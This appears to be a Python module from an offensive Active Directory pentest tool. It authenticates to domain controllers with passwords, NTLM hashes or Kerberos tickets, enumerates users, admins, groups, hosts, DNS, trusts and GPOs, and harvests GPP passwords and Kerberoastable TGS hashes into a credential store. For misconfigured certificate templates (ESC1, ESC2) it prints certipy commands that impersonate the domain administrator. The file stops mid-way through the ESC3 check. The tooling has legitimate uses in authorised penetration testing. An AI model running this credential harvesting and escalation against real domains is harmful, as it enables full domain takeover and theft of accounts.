import os
import re
import os.path
from time import sleep
import socket
import traceback
import struct
import copy

import OpenSSL

import dns.resolver
from ldap3.core.exceptions import LDAPSocketSendError

from lib.smbscan.smb import SMBScan
from .ldap import LDAPScan
from .kerberos import Kerberos
from .external import call_certipy

from utils.output import Output
from utils.utils import AuthFailure
from utils.db import DB
from utils.modulemanager import ModuleManager

ad_modules = ModuleManager('lib/adscan/modules')

windows_build = re.compile("Windows \\S+ Build (\\d+)")

def adscan_worker(target, actions, creds, ldap_protocol, python_ldap, timeout):
    # Process creds
    if 'username' in creds and '\\' in creds['username']:
        creds['domain'] = creds['username'].split('\\')[0]
        creds['username'] = creds['username'].split('\\')[1]
    try:
        smb_available = False
        smb_authenticated = False
        ldap_available = False
        ldap_authenticated = False

        try:
            smbscan = SMBScan(target['hostname'], 445, timeout)

            # == SMB check ==

            if smbscan.connect():
                # We are against a SMB server

                smb_available = True

                # Gather info
                smb_info = smbscan.get_server_info()

                # Get build version
                if smbscan.smbv1:
                    # Get build version via SMB2
                    smbv2 = SMBScan(target['hostname'], 445, timeout, use_smbv1=False)
                    if smbv2.connect():
                        smb_info_v2 = smbv2.get_server_info()
                        v2_os = smb_info_v2['server_os']
                    else:
                        v2_os = ""
                else:
                    v2_os = smb_info['server_os']

                m = windows_build.match(v2_os)
                if m:
                    build = m.group(1)
                else:
                    build = "Unknown"


                smb_info['target'] = smbscan.url()
                smb_info['message_type'] = 'smb'
                Output.write(smb_info)
                DB.insert_port({
                    'hostname': target['hostname'],
                    'port': 445,
                    'protocol': 'tcp',
                    'service': 'smb',
                    'version': smb_info['server_os'],
                    'service_info': {
                        'os': smb_info['server_os'],
                        'domain': smb_info['domain'],
                        'hostname': smb_info['hostname'],
                        'signing': smb_info['signing'],
                        'smbv1': smb_info['smbv1'],
                        'build': build,
                    }
                })

                # We need to disconnect after get_server_info
                smbscan.disconnect()

                # Start new connection
                smbscan.connect()

                success = False
                is_admin = False

                if 'kerberos' in creds:
                    ticket = os.environ['KRB5CCNAME']

                    from impacket.krb5.ccache import CCache
                    ccache = CCache.loadFile(ticket)
                    domain = ccache.principal.realm['data'].decode('utf-8')
                    principal = 'cifs/%s@%s' % (smb_info['hostname'].upper(), domain.upper())
                    ticket_creds = ccache.getCredential(principal)
                    if ticket_creds is not None:
                        user = ticket_creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                    elif len(ccache.principal.components) > 0:
                        user = ccache.principal.components[0]['data'].decode('utf-8')

                    creds['username'] = user
                    creds['domain'] = domain

                creds_smb = copy.copy(creds)

                # Authenticate
                if not 'username' in creds_smb:
                    creds_smb['username'] = ''

                if not 'domain' in creds_smb:
                    raise Exception("Please specify the account domain with -d")

                if 'kerberos' in creds:
                    try:
                        dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None

                        success, is_admin = smbscan.kerberos_auth(dc_ip=dc_ip)

                        Output.success({'target': smbscan.url(), 'message': 'Successful authentication from kerberos ticket %s (%s\\%s)' % (ticket, creds['domain'], creds['username'])})

 
                    except AuthFailure as e:
                        Output.minor({'target': smbscan.url(), 'message': 'Authentication failure with kerberos ticket %s (%s\\%s)' % (ticket, creds['domain'], creds['username'])})

                elif 'password' in creds_smb:
                    try:
                        success, is_admin = smbscan.auth(domain=creds_smb['domain'], username=creds_smb['username'], password=creds_smb['password'])
                        Output.success({'target': smbscan.url(), 'message': 'SMB: Successful authentication with credentials {domain}\\{username} and password {password}'.format(**creds_smb)})
                    except AuthFailure as e:
                        Output.minor({'target': smbscan.url(), 'message': 'SMB: Authentication failure with credentials {domain}\\{username} and password {password}: %s'.format(**creds_smb) % str(e)})
                elif 'hash' in creds_smb:
                    try:
                        success, is_admin = smbscan.auth(domain=creds_smb['domain'], username=creds_smb['username'], hash=creds_smb['hash'])
                        Output.success({'target': smbscan.url(), 'message': 'SMB: Successful authentication with credentials {domain}\\{username} and hash {hash}'.format(**creds_smb)})
                    except AuthFailure as e:
                        Output.minor({'target': smbscan.url(), 'message': 'SMB: Authentication failure with credentials {domain}\\{username} and hash {hash}: %s'.format(**creds_smb) % str(e)})
                else:
                    try:
                        success, is_admin = smbscan.auth(domain=creds_smb['domain'], username=creds_smb['username'], password='')
                        Output.success({'target': smbscan.url(), 'message': 'SMB: Successful authentication with credentials {domain}\\{username} and no password'.format(**creds_smb)})
                    except AuthFailure as e:
                        Output.minor({'target': smbscan.url(), 'message': 'SMB: Authentication failure with credentials {domain}\\{username} and no password: %s'.format(**creds_smb) % str(e)})

                if success:
                    smb_authenticated = True

                    if 'password' in creds_smb:
                        cred_info = {
                            'domain': creds['domain'],
                            'username': creds['username'],
                            'type': 'password',
                            'password': creds['password'],
                        }
                        DB.insert_domain_credential(cred_info)

                    elif 'hash' in creds_smb:
                        cred_info = {
                            'domain': creds['domain'],
                            'username': creds['username'],
                            'type': 'hash',
                            'format': 'ntlm',
                            'hash': creds['hash'],
                        }
                        DB.insert_domain_credential(cred_info)

                    if is_admin:
                        Output.major({'target': smbscan.url(), 'message': 'SMB: Administrative privileges with credentials {domain}\\{username}'.format(**creds_smb)})
        except Exception as e:
            print("%s: %s\n%s" % (type(e), e, traceback.format_exc()))

        # == LDAP check ==
        try:

            target_domain = actions['target_domain']
            domain = creds['domain'] if 'domain' in creds else None
            username = creds['username'] if 'username' in creds else None
            password = ''
            ntlm = ''
            if 'password' in creds:
                password = creds['password']
            elif 'hash' in creds:
                if not ':' in creds['hash']:
                    ntlm = 'aad3b435b51404eeaad3b435b51404ee:%s' % creds['hash']
                else:
                    ntlm = creds['hash']
            doKerberos = creds['kerberos'] if 'kerberos' in creds else False
            dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None

            success = False
            if ldap_protocol:
                ldap_protocols = [ldap_protocol]
            else:
                ldap_protocols = ['ldaps', 'ldap', 'gc']

            for ldap_protocol in ldap_protocols:
                success = False
                try:
                    ldapscan = LDAPScan(target['hostname'], timeout, protocol=ldap_protocol, python_ldap=python_ldap)
                    success, ldap_info = ldapscan.connect(target_domain, domain, username, password, ntlm, doKerberos, dc_ip)

                    if success:
                        break

                    Output.minor({'target': ldapscan.url(), 'message': 'Failed to authenticate via %s' % ldap_protocol})
                except OpenSSL.SSL.SysCallError as e:
                    pass
            else:
                Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Unable to connect to LDAP'})

            if success:
                ldap_available = True
                ldap_authenticated = True

                Output.write({'target': ldapscan.url(), 'message': 'LDAP: %s  %s' % (ldap_info['default_domain_naming_context'].ljust(50), ldap_info['domain_sid'])})
                DB.insert_port({
                    'hostname': target['hostname'],
                    'port': 389,
                    'protocol': 'tcp',
                    'service': 'ldap',
                    'service_info': {
                        'domain_sid': ldap_info['domain_sid'],
                        'default_domain_naming_context': ldap_info['default_domain_naming_context'],
                    }
                })

                if doKerberos == True:
                        Output.success({'target': ldapscan.url(), 'message': 'Successful authentication from kerberos ticket %s (%s\\%s)' % (ticket, creds['domain'], creds['username'])})

                elif username == None:
                    Output.success({'target': ldapscan.url(), 'message': 'LDAP: Successful authentication with null bind'})
                elif domain != None:
                    if 'password' in creds:
                        Output.success({'target': ldapscan.url(), 'message': 'LDAP: Successful authentication with credentials %s\\%s and password %s' % (domain, username, password)})

                        cred_info = {
                            'domain': domain,
                            'username': username,
                            'type': 'password',
                            'password': password,
                        }
                        DB.insert_domain_credential(cred_info)

                    elif 'hash' in creds:
                        Output.success({'target': ldapscan.url(), 'message': 'LDAP: Successful authentication with credentials %s\\%s and hash %s' % (domain, username, ntlm)})

                        cred_info = {
                            'domain': domain,
                            'username': username,
                            'type': 'hash',
                            'format': 'ntlm',
                            'hash': ntlm,
                        }
                        DB.insert_domain_credential(cred_info)
                else:
                    if 'password' in creds:
                        Output.success({'target': ldapscan.url(), 'message': 'LDAP: Successful authentication with credentials %s and password %s' % (username, password)})
                    elif 'hash' in creds:
                        Output.success({'target': ldapscan.url(), 'message': 'LDAP: Successful authentication with credentials %s and hash %s' % (username, password)})

            else:
                if username == None:
                    Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Failed authentication with null bind'})
                elif domain != None:
                    if 'password' in creds:
                        Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Failed authentication with credentials %s\\%s and password %s' % (domain, username, password)})
                    elif 'hash' in creds:
                        Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Failed authentication with credentials %s\\%s and hash %s' % (domain, username, password)})
                else:
                    if 'password' in creds:
                        Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Failed authentication with credentials %s and password %s' % (username, password)})
                    elif 'hash' in creds:
                        Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Failed authentication with credentials %s and hash %s' % (username, password)})
        except Exception as e:
            print("%s: %s\n%s" % (type(e), e, traceback.format_exc()))

        if smb_available or ldap_available:
            # Perform actions

            if 'domains' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Domains'})
                if ldap_authenticated:
                    def callback(entry):
                        #print(entry)
                        domain = entry['domain']
                        domain_sid = entry['sid']

                        DB.insert_domain_domain({
                            'domain': entry['domain'],
                            'name': entry['name'],
                            'parameters': entry['parameters'],
                            'sid': entry['sid'],
                            'dn': entry['dn'],
                            'functionallevel': entry['functionallevel'],
                            # For bloodhound
                            'affected_computers': entry['affected_computers'],
                            'gpo_effect': entry['gpo_effect'],
                            'child_objects': entry['child_objects'],
                            'trusts': entry['trusts'],
                            'links': entry['links'],
                            'aces': entry['aces'],
                        })
                        Output.write({'target': ldapscan.url(), 'message': '- %s:' % (entry['domain'],)})
                        Output.write({'target': ldapscan.url(), 'message': '   Parameters:'})
                        for param_name, param_value in entry['parameters'].items():
                            Output.write({'target': ldapscan.url(), 'message': '    - %s: %s' % (param_name, param_value)})

                        # List containers
                        Output.write({'target': ldapscan.url(), 'message': '   Containers:'})
                        def callback_containers(entry):
                            DB.insert_domain_container({
                                'domain': entry['domain'],
                                'name': entry['name'],
                                'domain_sid': domain_sid,
                                'dn': entry['dn'],
                                'guid': entry['guid'],
                                # For bloodhound
                                'child_objects': entry['child_objects'],
                                'aces': entry['aces'],
                            })
                            Output.write({'target': ldapscan.url(), 'message': '    - %s' % (entry['name'],)})

                        ldapscan.list_containers(domain, callback_containers)

                        # List OUs
                        Output.write({'target': ldapscan.url(), 'message': '   OUs:'})
                        def callback_ous(entry):
                            DB.insert_domain_ou({
                                'domain': entry['domain'],
                                'name': entry['name'],
                                'domain_sid': domain_sid,
                                'dn': entry['dn'],
                                'guid': entry['guid'],
                                # For bloodhound
                                'affected_computers': entry['affected_computers'],
                                'gpo_effect': entry['gpo_effect'],
                                'child_objects': entry['child_objects'],
                                'links': entry['links'],
                                'aces': entry['aces'],
                            })
                            Output.write({'target': ldapscan.url(), 'message': '    - %s' % (entry['name'],)})

                        ldapscan.list_ous(smbscan, domain, domain_sid, callback_ous)


                    ldapscan.list_domains(smbscan, callback)
                else:
                    raise NotImplementedError('Dumping domains through SMB')

            if 'users' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Users:'})
                if ldap_authenticated:
                    def callback(entry):
                        #print(entry)
                        user = '%s\\%s' % (entry['domain'], entry['username'])
                        DB.insert_domain_user({
                            'domain': entry['domain'],
                            'username': entry['username'],
                            'user': user,
                            'fullname': entry['fullname'],
                            'comment': entry['comment'],
                            'created_date': entry['created_date'],
                            'last_logon': entry['last_logon'],
                            'last_password_change': entry['last_password_change'],
                            'primary_gid': entry['primary_gid'],
                            'sid': entry['sid'],
                            'rid': entry['rid'],
                            'dn': entry['dn'],
                            'tags': entry['tags'],
                            'group': entry['group'],
                            'aces': entry['aces'],
                            'spns': entry['spns'],
                        })
                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['fullname'].ljust(30), ",".join(entry['tags']))})

                    ldapscan.list_users(callback)
                else:
                    raise NotImplementedError('Dumping users through SMB')

            if 'admins' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Admins:'})
                if ldap_authenticated:
                    for entry in ldapscan.list_admins():
                        user = '%s\\%s' % (entry['details']['domain'], entry['details']['username'])

                        tags = entry['details']['tags']
                        for g in entry['groups']:
                            groupname = g.split('\\')[-1]
                            tags.append("group:%s" % groupname)

                        DB.insert_domain_user({
                            'domain': entry['details']['domain'],
                            'username': entry['details']['username'],
                            'user': user,
                            'fullname': entry['details']['fullname'],
                            'comment': entry['details']['comment'],
                            'created_date': entry['details']['created_date'],
                            'last_logon': entry['details']['last_logon'],
                            'last_password_change': entry['details']['last_password_change'],
                            'sid': entry['details']['sid'],
                            'rid': entry['details']['rid'],
                            'dn': entry['details']['dn'],
                            'group': entry['groups'],
                            'tags': tags,
                        })

                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (entry['user'].ljust(30), '; '.join(entry['groups']))})
                else:
                    raise NotImplementedError('Dumping users through SMB')

            if 'rdp' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Users with RDP access:'})
                if ldap_authenticated:
                    for entry in ldapscan.list_rdp_users():
                        user = '%s\\%s' % (entry['details']['domain'], entry['details']['username'])
                        """
                        DB.insert_domain_user({
                            'domain': entry['details']['domain'],
                            'username': entry['details']['username'],
                            'user': user,
                            'fullname': entry['details']['fullname'],
                            'comment': entry['details']['comment'],
                            'created_date': entry['details']['created_date'],
                            'last_logon': entry['details']['last_logon'],
                            'last_password_change': entry['details']['last_password_change'],
                            'sid': entry['details']['sid'],
                            'rid': entry['details']['rid'],
                            'dn': entry['details']['dn'],
                            'tags': entry['details']['tags'],
                        })
                        """

                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['details']['fullname'].ljust(30), ",".join(entry['details']['tags']))})
                else:
                    raise NotImplementedError('Dumping users through SMB')


            if 'groups' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Groups:'})
                if ldap_authenticated:
                    def callback(entry):
                        group = '%s\\%s' % (entry['domain'], entry['groupname'])
                        DB.insert_domain_group({
                            'domain': entry['domain'],
                            'groupname': entry['groupname'],
                            'group': group,
                            'comment': entry['comment'],
                            'sid': entry['sid'],
                            'rid': entry['rid'],
                            'dn': entry['dn'],
                            'members': entry['members'],
                            'tags': entry['tags'],
                            'aces': entry['aces'],
                        })

                        Output.write({'target': ldapscan.url(), 'message': '- %s   (%d members)   %s  [%s]' % (group.ljust(40), len(entry['members']), entry['comment'].ljust(30), ",".join(entry['tags']))})

                    ldapscan.list_groups(callback)
                else:
                    raise NotImplementedError('Dumping groups through SMB')
            if 'hosts' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Hosts:'})
                if ldap_authenticated:
                    def callback(entry):
                        DB.insert_domain_host({
                            'domain': entry['domain'],
                            'os': entry['os'],
                            'hostname': entry['hostname'],
                            'dns': entry['dns'],
                            'comment': entry['comment'],
                            'dn': entry['dn'],
                            'tags': entry['tags'],
                            'sid': entry['sid'],
                            'primary_gid': entry['primary_gid'],
                            'aces': entry['aces'],
                            'spns': entry['spns'],
                            'created_date': entry['created_date'],
                            'last_logon': entry['last_logon'],
                            'last_password_change': entry['last_password_change'],
                        })

                        host = '%s\\%s' % (entry['domain'], entry['hostname'])
                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s   %s  [%s]' % (host.ljust(30), entry['os'].ljust(20), entry['comment'].ljust(25), ','.join(entry['tags']))})
                    ldapscan.list_hosts(callback)
                else:
                    raise NotImplementedError('Dumping hosts through SMB')
            if 'dns' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'DNS entries:'})
                if ldap_authenticated:
                    global dns_timeout
                    dns_timeout = False
                    def callback(entry):
                        # resolve dns entry
                        global dns_timeout

                        if not dns_timeout:
                            try:
                                resolver = dns.resolver.Resolver()
                                resolver.timeout = 5
                                resolver.lifetime = 5
                                resolver.nameservers = [target['hostname']]
                                answer = resolver.query(entry, "A")
                                ips = [str(r) for r in answer]
                            except dns.resolver.NXDOMAIN:
                                ips = []
                            except dns.resolver.NoAnswer:
                                ips = []
                            except dns.exception.Timeout:
                                ips = []
                                dns_timeout = True
                            except dns.resolver.NoNameservers:
                                ips = []
                                dns_timeout = True
                        else:
                            ips = []

                        Output.write({'target': ldapscan.url(), 'message': '- %s (%s)' % (entry.ljust(50), ','.join(ips))})

                        if len(ips) != 0:
                            for ip in ips:
                                DB.insert_dns({
                                    'source': entry,
                                    'query_type': 'A',
                                    'target': ip,
                                })

                    ldapscan.list_dns(callback)
                else:
                    raise NotImplementedError('Dumping DNS through SMB')

            if 'gpps' in actions:
                Output.highlight({'target': smbscan.url(), 'message': 'Passwords in GPPs:'})
                if smb_authenticated:
                    for entry in smbscan.list_gpps():
                        # insert domain vulnerability
                        DB.insert_domain_vulnerability({
                            'hostname': target['hostname'],
                            'domain': entry['domain'],
                            'name': 'Password in GPP',
                            'description': 'Password in GPP: User => %s, Password => %s' % (entry['username'], entry['password']),
                        })

                        cred_info = {
                            'domain': entry['domain'],
                            'username': entry['username'],
                            'type': 'password',
                            'password': entry['password'],
                        }
                        DB.insert_domain_credential(cred_info)

                        Output.write({'target': smbscan.url(), 'message': '- %s   %s' % (entry['username'].ljust(40), entry['password'].ljust(20))})

            if 'spns' in actions:
                Output.highlight({'target': smbscan.url(), 'message': 'SPNs:'})
                if smb_authenticated:
                    for entry in smbscan.list_spns(ldapscan.defaultdomainnamingcontext):
                        user = '%s\\%s' % (entry['domain'], entry['username'])
                        tgs_hash = entry['tgs']['tgs'] if 'tgs' in entry['tgs'] else 'Unable to retreive TGS hash'
                        Output.vuln({'target': smbscan.url(), 'message': '- %s   %s   %s\n%s' % (entry['spn'].ljust(30), user.ljust(40), entry['tgs']['format'], tgs_hash)})

                        # insert domain SPN
                        DB.insert_domain_spn({
                            'domain': entry['domain'],
                            'spn': entry['spn'],
                            'username': entry['username'],
                        })


                        if 'tgs' in entry['tgs']:
                            spn_hash = str(entry['tgs']['tgs'])
                            hash_parts = spn_hash.split('$')
                            hash_format = "%s_%s" % (hash_parts[1], hash_parts[2])

                            cred_info = {
                                'domain': entry['domain'],
                                'username': entry['username'],
                                'type': 'hash',
                                'format': hash_format,
                                'hash': spn_hash,
                            }
                            DB.insert_domain_credential(cred_info)



            if 'passpol' in actions:
                if smb_authenticated:
                    try:
                        password_policy = smbscan.enum_password_policy()
                        output = "Password policy:\n"
                        output += " "*60+"- Complexity:       %s\n" % ("Enabled" if password_policy['complexity'] == 1 else "Disabled",)
                        output += " "*60+"- Minimum length:   %d\n" % password_policy['minimum_length']
                        output += " "*60+"- History:          last %d passwords\n" % password_policy['history_length']
                        output += " "*60+"- Maximum age:      %s\n" % password_policy['maximum_age']
                        output += " "*60+"- Minimum age:      %s\n" % password_policy['minimum_age']
                        output += " "*60+"- Lock threshold:   %s\n" % (str(password_policy['lock_threshold']) if password_policy['lock_threshold'] != 0 else "Disabled",)
                        if password_policy['lock_threshold'] != 0:
                            output += " "*60+"- Lock duration:    %s\n" % password_policy['lock_duration']

                        # insert domain vulnerability if lock_threshold == 0
                        if password_policy['lock_threshold'] == 0:
                            DB.insert_domain_vulnerability({
                                'hostname': target['hostname'],
                                'domain': password_policy['domain'],
                                'name': 'No account lockout',
                                'description': 'No account lockout for domain %s, accounts can be bruteforced' % (password_policy['domain'],),
                            })

                        Output.highlight({'target': smbscan.url(), 'message': output})
                    except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
                        if 'access_denied' in str(e):
                            Output.write({'target': smbscan.url(), 'message': 'Enum password policy: Access denied'})
                        else:
                            raise e

            if 'trusts' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Trusts:'})
                if ldap_authenticated:
                    def callback(entry):
                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s   %s   [%s]' % (entry['domain'].ljust(30), entry['direction'].ljust(20), entry['type'].ljust(20), ','.join(entry['tags']))})
                    ldapscan.list_trusts(callback)
                else:
                    raise NotImplementedError('Dumping trusts through SMB')

            if 'gpos' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'GPOs:'})
                if ldap_authenticated:
                    def callback(entry):
                        #print(entry)
                        DB.insert_domain_gpo({
                            'domain': entry['domain'],
                            'domain_sid': entry['domain_sid'],
                            'name': entry['name'],
                            'guid': entry['guid'],
                            'dn': entry['dn'],
                            'gpcpath': entry['gpcpath'],
                            'aces': entry['aces'],
                        })
                        Output.write({'target': ldapscan.url(), 'message': '- %s   [%s]' % (entry['name'].ljust(30), entry['gpcpath'])})

                    ldapscan.list_gpos(callback)
                else:
                    raise NotImplementedError('Dumping GPOs through SMB')


            if 'casrv' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'ADCS servers:'})
                if ldap_authenticated:
                    def callback(entry):
                        Output.write({'target': ldapscan.url(), 'message': '- %s %s' % (entry['name'].ljust(30), entry['hostname'])})
                    ldapscan.list_casrv(callback)
                else:
                    raise NotImplementedError('Dumping CA servers through SMB')

            if 'ca_certs' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'CA certs:'})
                if ldap_authenticated:
                    def callback(entry):
                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (entry['algo'].ljust(30), ','.join(entry['common_names']))})
                    ldapscan.list_cacerts(callback)
                else:
                    raise NotImplementedError('Dumping CA Cert through SMB')

            if 'certipy' in actions:
                Output.highlight({'target': ldapscan.url(), 'message': 'Certipy:'})
                if ldap_authenticated:
                    ca_vulns, template_vulns = call_certipy(target['hostname'], creds, ldapscan.protocol)

                    Output.highlight({'target': ldapscan.url(), 'message': 'Certificate Authorities vulnerabilities:'})
                    for vuln in ca_vulns:
                        Output.vuln({'target': ldapscan.url(), 'message': '%s (%s) %s' % (('[%s]' % vuln['ca']).ljust(20), vuln['vuln_name'], vuln['description'])})

                        DB.insert_domain_vulnerability({
                            'hostname': target['hostname'],
                            'domain': smb_info['domain'],
                            'name': vuln['vuln_name'],
                            'description': vuln['description'],
                        })

                    Output.highlight({'target': ldapscan.url(), 'message': 'Certificate Templates vulnerabilities:'})
                    for vuln in template_vulns:
                        Output.vuln({'target': ldapscan.url(), 'message': '%s (%s) %s' % (('[%s]' % vuln['template']).ljust(20), vuln['vuln_name'], vuln['description'])})

                        DB.insert_domain_vulnerability({
                            'hostname': target['hostname'],
                            'domain': smb_info['domain'],
                            'name': vuln['vuln_name'],
                            'description': vuln['description'],
                        })

            if 'cert_templates' in actions:
                if ldap_authenticated:
                    enrollment_services = []
                    def callback(entry):
                        enrollment_services.append(entry)
                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s" % (entry['name'].ljust(30), entry['dns'])})

                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
                    ldapscan.list_enrollment_services(callback)

                    def callback(entry):
                        enabled = False
                        enrollment_service = None
                        for e_s in enrollment_services:
                            if entry['name'] in e_s['templates']:
                                enabled = True
                                enrollment_service = e_s['name']
                                break

                        if enabled: 
                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)  => %s" % (entry['name'].ljust(30), enrollment_service)})
                        else:
                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)" % (entry['name'].ljust(30),)})


                    Output.highlight({'target': ldapscan.url(), 'message': 'Certificate templates:'})
                    ldapscan.list_cert_templates(callback)
                else:
                    raise NotImplementedError('Dumping hosts through LDAP')

            if 'esc1' in actions:

                if len(actions['esc1']['user']) == 0:
                    domain = creds['domain']
                    username = creds['username']
                elif not '\\' in actions['esc1']['user']:
                    domain = creds['domain']
                    username = actions['esc1']['user']
                else:
                    domain = actions['esc1']['user'].split('\\')[0]
                    username = actions['esc1']['user'].split('\\')[-1]

                if ldap_authenticated:
                    enrollment_services = []
                    def callback(entry):
                        enrollment_services.append(entry)
                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s   User can enroll:%s" % (entry['name'].ljust(30), entry['dns'].ljust(30), entry['can_enroll'])})

                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
                    ldapscan.list_enrollment_services(callback, username=username)

                    def callback(entry):
                        enabled = False
                        enrollment_service = None
                        can_enroll = False
                        for e_s in enrollment_services:
                            if entry['name'] in e_s['templates']:
                                enabled = True
                                enrollment_service = e_s['name']
                                can_enroll = e_s['can_enroll']
                                break

                        enrollee_supplies_subject = 'True ' if 'ENROLLEE_SUPPLIES_SUBJECT' in entry['cert_name_flag'] else 'False'
                        enroll = entry['enrollment_right']
                        status = enroll['type']
                        name = enroll['name'] if 'name' in enroll else enroll['sid']

                        if enabled and can_enroll:
                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollee Supplies Subject:  %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), enrollee_supplies_subject, status, name)})

                            impersonate = "administrator"

                            if username == creds['username']:
                                account = "%s/%s" % (domain, username)
                                if 'password' in creds:
                                    account += ":%s@%s" % (creds['password'], target['hostname'])
                                elif 'hash' in creds:
                                    account += "@%s -hashes %s" % (target['hostname'], creds['hash'])
                                else:
                                    account += ":%s@%s" % ('<password>', target['hostname'])
                            else:
                                password = "<password>"
                                account = "%s/%s:%s@%s" % (domain, username, password, target['hostname'])

                            ca = enrollment_service

                            request_cert = "certipy req '%s' -ca '%s' -template '%s' -alt '%s@%s'" % (account, ca, entry['name'], impersonate, smb_info['domain']) 
                            request_tgt = "certipy auth -pfx %s.pfx" % impersonate
                            Output.vuln({'target': ldapscan.url(), 'message': "To exploit, run these commands:\n%s\n%s" % (request_cert, request_tgt)})
                        else:
                            enabled = 'Enabled' if enabled else 'Disabled'
                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (%s)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollee Supplies Subject:  %s\n\tEnrollment rights:          (%s) %s\n\tCertificate service: user can enroll: %s" % (entry['name'].ljust(30), enabled, enrollment_service, ','.join(entry['eku']), enrollee_supplies_subject, status, name, can_enroll)})


                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC1) exploitable by user %s:' % username})
                    ldapscan.check_esc1(username, callback)

            if 'esc2' in actions:

                if len(actions['esc2']['user']) == 0:
                    #domain = creds['domain']
                    username = creds['username']
                elif not '\\' in actions['esc2']['user']:
                    #domain = creds['domain']
                    username = actions['esc2']['user']
                else:
                    #domain = actions['esc2']['user'].split('\\')[0]
                    username = actions['esc2']['user'].split('\\')[-1]

                if ldap_authenticated:
                    enrollment_services = []
                    def callback(entry):
                        enrollment_services.append(entry)
                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s   User can enroll:%s" % (entry['name'].ljust(30), entry['dns'].ljust(30), entry['can_enroll'])})

                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
                    ldapscan.list_enrollment_services(callback, username=username)

                    def callback(entry):
                        enabled = False
                        enrollment_service = None
                        can_enroll = False
                        for e_s in enrollment_services:
                            if entry['name'] in e_s['templates']:
                                enabled = True
                                enrollment_service = e_s['name']
                                can_enroll = e_s['can_enroll']
                                break
              
                        enroll = entry['enrollment_right']
                        status = enroll['type']
                        name = enroll['name'] if 'name' in enroll else enroll['sid']

                        if enabled and can_enroll:
                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), status, name)})

                            impersonate = "administrator"

                            if username == creds['username']:
                                account = "%s/%s" % (domain, username)
                                if 'password' in creds:
                                    account += ":%s@%s" % (creds['password'], target['hostname'])
                                elif 'hash' in creds:
                                    account += "@%s -hashes %s" % (target['hostname'], creds['hash'])
                                else:
                                    account += ":%s@%s" % ('<password>', target['hostname'])
                            else:
                                password = "<password>"
                                account = "%s/%s:%s@%s" % (domain, username, password, target['hostname'])

                            ca = enrollment_service

                            request_cert1 = "certipy req '%s' -ca '%s' -template '%s'" % (account, ca, entry['name']) 
                            request_cert2 = "certipy req '%s' -ca '%s' -template 'User' -on-behalf-of '%s' -pfx '%s.pfx'" % (account, ca, impersonate, username) 
                            request_tgt = "certipy auth -pfx %s.pfx" % impersonate
                            Output.vuln({'target': ldapscan.url(), 'message': "To exploit, run these commands:\n%s\n%s\n%s" % (request_cert1, request_cert2, request_tgt)})
                        else:
                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), status, name)})

                       
                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC2) exploitable by user %s:' % username})
                    ldapscan.check_esc2(username, callback)

            if 'esc3' in actions:

                if len(actions['esc3']['user']) == 0:
                    #domain = creds['domain']
                    username = creds['username']
                elif not '\\' in actions['esc3']['user']:
                    #domain = creds['domain']
                    username = actions['esc3']['user']
                else:
                    #domain = actions['esc3']['user'].split('\\')[0]
                    username = actions['esc3']['user'].split('\\')[-1]

                if ldap_authenticated:
                    enrollment_services = []
                    def callback(entry):
                        enrollment_services.append(entry)
                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s   User can enroll:%s" % (entry['name'].ljust(30), entry['dns'].ljust(30), entry['can_enroll'])})

                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
                    ldapscan.list_enrollment_services(callback, username=username)

                    def callback(entry):
                        enabled = False
                        enrollment_service = None
                        can_enroll = False
                        for e_s in enrollment_services:
                            if entry['name'] in e_s['templates']:
                                enabled = True
                                enrollment_service = e_s['name']
                                can_enroll = e_s['can_enroll']
                                break
              
                        enroll = entry['enrollment_right']
                        status = enroll['type']
                        name = enroll['name'] if 'name' in enroll else enroll['sid']

                        if enabled and can_enroll:
